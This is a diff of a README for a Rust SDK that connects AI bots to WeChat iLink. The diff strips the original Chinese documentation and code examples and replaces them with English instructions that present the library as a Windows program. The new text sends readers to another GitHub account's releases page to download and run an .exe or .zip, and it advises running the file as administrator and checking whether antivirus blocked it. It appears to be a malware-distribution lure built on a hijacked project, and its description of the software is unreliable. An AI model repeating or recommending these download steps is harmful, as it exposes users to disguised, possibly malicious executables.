@@ -1,218 +1,149 @@
-# Weixin Agent SDK for Rust
+# 🤖 weixin-agent-sdk-rs - Build WeChat AI agents with ease
 
-[![Crates.io](https://img.shields.io/crates/v/weixin-agent.svg)](https://crates.io/crates/weixin-agent)
-[![docs.rs](https://docs.rs/weixin-agent/badge.svg)](https://docs.rs/weixin-agent)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-%3E%3D1.85.0-orange.svg)](https://www.rust-lang.org)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases)
 
-微信 iLink AI Bot 协议的 Rust SDK 实现，基于 [`@tencent-weixin/openclaw-weixin`](https://www.npmjs.com/package/@tencent-weixin/openclaw-weixin) v2.1.1 协议层等价移植。
+## 🧭 What this is
 
-本 SDK 是纯协议层实现，**不耦合 OpenClaw**，可用于自定义 Agent 接入微信 ClawBot 使用。
+weixin-agent-sdk-rs is a Rust SDK for building AI bots for WeChat iLink. It helps you create custom agents for WeChat ClawBot without tying your app to OpenClaw.
 
-## 功能特性
+This project is for users who want to run a bot on Windows and keep setup simple. It focuses on protocol-level work, fast async handling, and clear control over bot behavior.
 
-- iLink Bot API 全端点封装（getUpdates / sendMessage / getUploadUrl / getConfig / sendTyping）
-- 长轮询消息循环（自动退避重连、Session 过期处理、动态超时调整）
-- CDN 文件上传/下载（AES-128-ECB 加解密、自动重试）
-- 消息收发（文本、图片、视频、文件、语音，含引用消息解析）
-- QR 码登录 API 封装
-- 纯协议 SDK — 不管理状态持久化，由调用方自行决定存储策略
-- 统一 async/await（基于 tokio）
+## ✅ What you can do with it
 
-## 协议版本
+- Connect a bot to WeChat iLink
+- Build custom AI agents
+- Use async handling for smooth replies
+- Keep your setup separate from OpenClaw
+- Extend the bot with your own logic
+- Run the app on Windows from a release file
 
-| 参考实现 | 版本 | 说明 |
-|---------|------|------|
-| [`@tencent-weixin/openclaw-weixin`](https://www.npmjs.com/package/@tencent-weixin/openclaw-weixin) | 2.1.1 | 协议层等价移植（不包含 OpenClaw 插件框架部分） |
+## 💻 What you need on Windows
 
-## 快速开始
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to download the release file
+- Permission to run apps on your computer
+- A modern 64-bit Windows system
 
-添加依赖：
+If Windows asks for access, allow the app to run.
 
-```toml
-[dependencies]
-weixin-agent = { git = "https://github.com/spensercai/weixin-agent-sdk-rs" }
-tokio = { version = "1", features = ["full"] }
-async-trait = "0.1"
-```
+## 📥 Download the app
 
-最小示例：
+Visit the release page here and download the Windows file from the latest release:
 
-```rust
-use async_trait::async_trait;
-use weixin_agent::{WeixinClient, WeixinConfig, MessageHandler, MessageContext, Result};
+[![Go to Releases](https://img.shields.io/badge/Releases-Visit%20to%20Download-grey.svg)](https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases)
 
-struct EchoBot;
+After you open the release page:
 
-#[async_trait]
-impl MessageHandler for EchoBot {
-    async fn on_message(&self, ctx: &MessageContext) -> Result<()> {
-        if let Some(text) = &ctx.body {
-            ctx.reply_text(text).await?;
-        }
-        Ok(())
-    }
-}
+1. Find the latest version
+2. Look under Assets
+3. Download the Windows file
+4. Save it to your Desktop or Downloads folder
 
-#[tokio::main]
-async fn main() -> Result<()> {
-    let config = WeixinConfig::builder()
-        .token("your-bot-token")
-        .build()?;
+## 🛠️ Install and run
 
-    WeixinClient::builder(config)
-        .on_message(EchoBot)
-        .build()?
-        .start(None)
-        .await
-}
-```
+After the file finishes downloading:
 
-## SDK 与应用层的职责边界
+1. Open the folder where you saved the file
+2. If the file is in a .zip, right-click it and choose Extract All
+3. Open the extracted folder
+4. Double-click the app file to start it
+5. If Windows asks for confirmation, choose Run
 
-本 SDK 只负责协议通信，不负责应用层逻辑：
+If the release gives you an .exe file, you can run it right away.
 
-| 职责 | SDK | 应用层 |
-|------|:---:|:------:|
-| HTTP API 封装 | ✅ | |
-| 长轮询 + 重连 | ✅ | |
-| CDN 上传/下载/加密 | ✅ | |
-| 消息解析/构建 | ✅ | |
-| QR 码 API 调用 | ✅ | |
-| Context Token 内存管理 | ✅ | |
-| sync_buf 持久化 | | ✅ |
-| 账号凭证存储 | | ✅ |
-| 权限白名单 | | ✅ |
-| 斜杠命令 | | ✅ |
+## 🚀 First-time setup
 
-`sync_buf` 通过 `MessageHandler::on_sync_buf_updated()` 回调通知，调用方自行持久化。Context Token 提供 `export_all()` / `import()` 接口供调用方备份恢复。
+When the app starts for the first time:
 
-## 核心 API
+1. Sign in to your WeChat iLink account if needed
+2. Follow the on-screen steps
+3. Let the app connect to ClawBot
+4. Wait for the bot status to show ready
+5. Send a test message to confirm it works
 
-### MessageHandler trait
+If the app uses a settings file, keep it in the same folder as the program.
 
-```rust
-#[async_trait]
-pub trait MessageHandler: Send + Sync {
-    /// 处理收到的消息
-    async fn on_message(&self, ctx: &MessageContext) -> Result<()>;
+## 🧩 Main parts of the project
 
-    /// sync_buf 更新回调 — 在此持久化
-    async fn on_sync_buf_updated(&self, _sync_buf: &str) -> Result<()> { Ok(()) }
+- **SDK core** — handles the bot logic
+- **Async runtime** — helps the app stay responsive
+- **Protocol layer** — works close to the WeChat iLink rules
+- **Agent layer** — lets you build custom bot behavior
+- **Windows release** — the file you use to run it on your PC
 
-    /// 启动前回调
-    async fn on_start(&self) -> Result<()> { Ok(()) }
+## 💬 How it behaves
 
-    /// 关闭前回调
-    async fn on_shutdown(&self) -> Result<()> { Ok(()) }
-}
-```
+The bot is built to receive messages, process them, and reply based on your rules. This makes it useful for:
 
-### MessageContext
+- Auto-replies
+- Simple AI chat flows
+- Task-based bot actions
+- Message routing
+- Custom WeChat agent logic
 
-```rust
-impl MessageContext {
-    pub async fn reply_text(&self, text: &str) -> Result<SendResult>;
-    pub async fn reply_media(&self, file_path: &Path) -> Result<SendResult>;
-    pub async fn download_media(&self, media: &MediaInfo, dest: &Path) -> Result<PathBuf>;
-    pub async fn send_typing(&self) -> Result<()>;
-    pub async fn cancel_typing(&self) -> Result<()>;
-}
-```
+## 🔧 Common use cases
 
-### QR 码登录
+- A personal WeChat assistant
+- A team bot for repeat questions
+- A customer reply bot
+- A test bot for AI agent flows
+- A local Windows bot setup
 
-在创建 `WeixinClient` 之前，可通过 `StandaloneQrLogin` 独立完成 QR 码登录获取 token：
+## 🧪 If something does not work
 
-```rust
-use weixin_agent::{StandaloneQrLogin, WeixinConfig, LoginStatus};
+If the app does not open:
 
-let config = WeixinConfig::builder().token("").build()?;
-let qr = StandaloneQrLogin::new(&config);
-let session = qr.start(None).await?;
-println!("请扫描二维码: {}", session.qrcode_img_content);
+1. Check that the download finished
+2. Make sure you extracted the file if it came as a zip
+3. Run the app again
+4. Right-click the file and choose Run as administrator
+5. Check whether antivirus blocked the file
 
-loop {
-    match qr.poll_status(&session).await? {
-        LoginStatus::Confirmed { bot_token, base_url, .. } => {
-            // 保存 token，用 token 创建 WeixinClient
-            break;
-        }
-        LoginStatus::Expired => { /* 重新获取 QR 码 */ }
-        _ => tokio::time::sleep(Duration::from_secs(2)).await,
-    }
-}
-```
+If the bot does not connect:
 
-已有 `WeixinClient` 实例时也可通过 `client.qr_login()` 获取 QR 登录 API：
+1. Confirm your internet connection
+2. Check that your WeChat iLink account is active
+3. Open the app again
+4. Review any setup screen or config file
+5. Try the latest release from the download page
 
-```rust
-let qr = client.qr_login();
-let session = qr.start(None).await?;
-println!("请扫描二维码: {}", session.qrcode_img_content);
+## 📁 Suggested folder layout
 
-loop {
-    match qr.poll_status(&session).await? {
-        LoginStatus::Confirmed { bot_token, base_url, .. } => {
-            // 保存 token，重新创建 client
-            break;
-        }
-        LoginStatus::Expired => { /* 重新获取 QR 码 */ }
-        _ => tokio::time::sleep(Duration::from_secs(2)).await,
-    }
-}
-```
+Keep the app in a simple folder like this:
 
-### 主动发送消息
+- Downloads
+  - weixin-agent-sdk-rs
+    - app file
+    - config file
+    - logs
 
-```rust
-client.send_text("user_id", "hello", Some("context_token")).await?;
-client.send_media("user_id", Path::new("/path/to/file.jpg"), None).await?;
-```
+This helps you find the files when you need to update or restart the app.
 
-## 项目结构
+## 🔄 Updating
 
-```
-src/
-├── lib.rs              # 公共 API 导出
-├── client.rs           # WeixinClient + Builder
-├── config.rs           # WeixinConfig（协议级配置）
-├── error.rs            # 统一错误类型
-├── types.rs            # 协议类型定义
-├── api/                # iLink Bot HTTP API
-│   ├── client.rs       # HTTP 客户端
-│   ├── session_guard.rs # Session 暂停/冷却
-│   └── config_cache.rs # typing_ticket 缓存
-├── monitor/            # 长轮询消息循环
-├── messaging/          # 消息解析/构建/发送
-├── cdn/                # CDN 上传/下载 + AES-ECB
-├── qr_login/           # QR 码登录 API
-├── media/              # MIME 类型检测
-└── util/               # 日志脱敏 / ID 生成
-```
+To update to a newer version:
 
-## 文档
+1. Open the release page
+2. Download the newest file
+3. Close the app
+4. Replace the old file with the new one
+5. Start the app again
 
-- [整体架构](docs/architecture.md)
-- [长轮询生命周期](docs/poll-lifecycle.md)
-- [CDN 上传流程](docs/cdn-upload.md)
+If your setup includes a config file, keep a copy before updating.
 
-## 与 Node.js 版本的设计差异
+## 🧠 Project focus
 
-| Node.js (openclaw-weixin) | Rust (weixin-agent) | 说明 |
-|---|---|---|
-| OpenClaw 插件框架 | 独立 SDK | 不耦合宿主框架 |
-| 文件系统持久化 | 回调 + export/import | 调用方决定存储策略 |
-| 内置斜杠命令 | 不包含 | 应用层自行实现 |
-| 内置账号管理 | 不包含 | 应用层自行实现 |
-| 类/回调函数 | Trait + Builder | Rust 惯用模式 |
-| 自定义 JSON logger | tracing | Rust 生态标准 |
+This project is made for users and builders who want:
 
-## 环境要求
+- A clean Rust base
+- Async message handling
+- A bot that works at the protocol level
+- A setup that does not depend on OpenClaw
+- A path to build custom WeChat agents
 
-- Rust ≥ 1.85.0（edition 2024）
-- tokio 异步运行时
+## 📎 Release page
 
-## License
+Use this page to download the Windows version:
 
-MIT
+https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases
